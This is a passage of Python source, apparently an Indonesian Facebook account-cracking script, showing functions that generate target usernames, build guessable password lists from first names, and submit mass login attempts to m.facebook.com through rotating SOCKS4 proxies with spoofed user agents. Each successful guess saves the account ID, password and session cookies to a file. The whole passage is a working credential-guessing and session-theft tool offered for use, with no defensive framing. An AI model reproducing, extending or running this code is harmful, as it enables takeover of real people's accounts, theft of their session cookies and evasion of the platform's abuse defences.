'referer': f'https://{url}/login.php?skip_api_login=1&api_key=123845574663321&kid_directed_site=0&app_id=123845574663321&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D123845574663321%26redirect_uri%3Dhttps%253A%252F%252Fcodepen.io%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a6658e7-a097-4bc6-9a7c-75ffc730d004%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcodepen.io%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{url}/login/device-based/login/async/?api_key=123845574663321&auth_token=9c1d712b60deea1bcd519d4102800b79&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D123845574663321%26redirect_uri%3Dhttps%253A%252F%252Fcodepen.io%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a6658e7-a097-4bc6-9a7c-75ffc730d004%26tp%3Dunspecified%26cbt%3D1692569475031&refsrc=deprecated&app_id=123845574663321&cancel=https%3A%2F%2Fcodepen.io%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%23_%3D_&lwv=100',headers=head, data=datane, cookies={'cookie': koki}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{xx}╭────────────────────────────╮{x}")
				tree = Tree('')
				tree.add(f"{xx}{idf}{x}").add(f"{xx}{pw}{x}")
				tree.add(f"{xxx}{ua}{x}")
				print(f"{xx}╰────────────────────────────╯{x}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{xx}╭────────────────────────────╮{x}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{x}").add(f"{hijo}{pw}{x}")
				tree.add(f"{hijo}{kuki}{x}").add(f"{xxx}{ua}{x}")
				print(f"{xx}╰────────────────────────────╯{x}")
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-OPSI ]----------#
# *--> ua jangan kasih rr/rc
# *--> sedaerah tapyes	
def ceker(idf,pw):
	global cp
	ua = "Mozilla/5.0 (Windows NT {str(rr(4,12))}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(83,103))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Safari/537.36"
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){x}")
			prints(tree)
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{xxx}{idf}{x}").add(f"{xxx}{pw}{x}")
		tree.add(f"{xx}spam ip tidak dapat cek opsi")
		prints(tree)
		#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		#cp+=1
		
#----------[ CRACK-EMAIL ]----------#	
def nge_tumbal():
	rc = random.choice
	rr = random.randint
	depan = "rahma","dinda","fajar","devanda","dwi","putri","gilang","ridho","refaldo","rendi"
	belakang = "gaming","babi","freefire","sanjaya","fatimah","50","70","59","100"
	global ok,cp
	print(f"{kun}╭────────────────────────────────────────────")
	username = console.input(f"└──[ Input Username : ")
	
	if "," in str(username):
	   help()
	print(f"{kun}╭────────────────────────────────────────────")
	kumpulkan = console.input(f"└──[ Input Total Username : ")
	print(f"{kun}╭────────────────────────────────────────────")
		
	for gimel in range(int(kumpulkan)):
	       aa = username
	       bb = f"{str(rc(depan))}",f"{str(rr(70,599))}",f"{str(rc(belakang))}",f"{str(rc(depan))}{str(rr(73,599))}",f"{gimel}",f"{str(rc(belakang))}{str(rr(70,599))}",f"{str(rc(depan))}{str(rc(belakang))}"
	       cc = f"@gmail.com"
	       dd = f"{aa}{str(rc(bb))}{cc}'"
	       if dd in id:pass
	       else:id.append(dd+'|'+username)
	       if len(dump)==999999:setting()
	       sys.stdout.write(f"\r└──[ {len(id)} Username ")
	       sys.stdout.flush()
	       time.sleep(0.0000003)
	print("\r")
	atur_dulu()									
						
#----------[ MENU-USERNAME ]----------#		
def atur_dulu():
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} 01. Idz tua ')
	print(f'{xx}└──[{x} 02. Idz muda ')
	print(f'{xx}└──[{x} 03. Idz random ')
	print(f"{kun}╭────────────────────────────────────────────{x}")	
	krek_idz = input(f'{xx}└──[{x} Input Idz : ')
	if krek_idz in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif krek_idz in ['2','02']:
		muda=[]
		for gas_idz in sorted(id):
			muda.append(gas_idz)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif krek_idz in ['3','03']:
		for gas_idz in id:
			moga_old = random.randint(0,len(id2))
			id2.insert(moga_old,gas_idz)
	else:
		help()
	
	print(f"{kun}╭────────────────────────────────────────────{x}")
	
	print(f"{xx}└──[{x} Tambahkan pw manual (y/t)")	
	print(f"{kun}╭────────────────────────────────────────────{x}")
	pwtambah=input(f"{xx}└──[{x} Input : ")
	if pwtambah in ['y','Y']:
		pwpluss.append('ya')
		print(f"{kun}╭────────────────────────────────────────────{x}")	
		pwku=input(f"{xx}└──[{x} Input pw : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrdxnx()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrdxnx():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f'{kun}└────────────────────────────────────────────{x}\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'sayang')
						pwv.append(frs+'sayang123')
						pwv.append(frs+'sayang3231')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'sayang')
						pwv.append(frs+'sayang123')
						pwv.append(frs+'sayang3231')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:
				    pool.submit(crack,idf,pwv)
				    
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} OK {hijo}: %s'%(ok))
	print(f'{xx}└──[{x} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{x}")

#----------[ METODE-ASYINC ]----------#	
def crack(idf,pwv):
	global loop,ok,cp
	ses = requests.Session();rr = random.randint
	prog.update(des,description=f"{xx}Asyinc{x} Oke : {hijo}{ok} {x}Check : {x}{loop}/{len(id)} ")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 
'try_number': '0', 
'unrecognized_tries': '0', 
'email': idf, 
'pass': pw, 
'prefill_contact_point': '', 
'prefill_source': '', 
'prefill_type': '', 
'first_prefill_source': '', 
'first_prefill_type': '', 
'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 
'is_smart_lock': 'false', 
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
"content-length": f"{len(str(dataa))}",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
"origin": "https://m.facebook.com",
"content-type": "application/x-www-form-urlencoded",
"user-agent": ua,
"accept": "*/*",
"x-requested-with": "com.microsoft.bing",
"sec-ch-ua": f'"Chromium";v="{str(rr(99,115))}", "Google Chrome";v="{str(rr(99,112))}", "Not;A=Brand";v="{str(rr(89,99))}"',
"sec-ch-ua-platform": '"Android"',
"sec-ch-ua-mobile": "?1",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"sec-fetch-user": "?1",
"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
"accept-encoding": "gzip, deflate br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f"{xx}╭────────────────────────────╮{x}")
				#tree = Tree('')
				#tree.add(f"{xx}{idf}{x}").add(f"{xx}{pw}{x}")
				#tree.add(f"{xxx}{ua}{x}")
				#print(f"{xx}╰────────────────────────────╯{x}")
				#prints(tree)
				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				#akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{xx}╭────────────────────────────╮{x}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{x}").add(f"{hijo}{pw}{x}").add(f"{hijo}{kuki}{x}")
				tree.add(f"{xxx}{ua}{x}")
				print(f"{xx}╰────────────────────────────╯{x}")
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
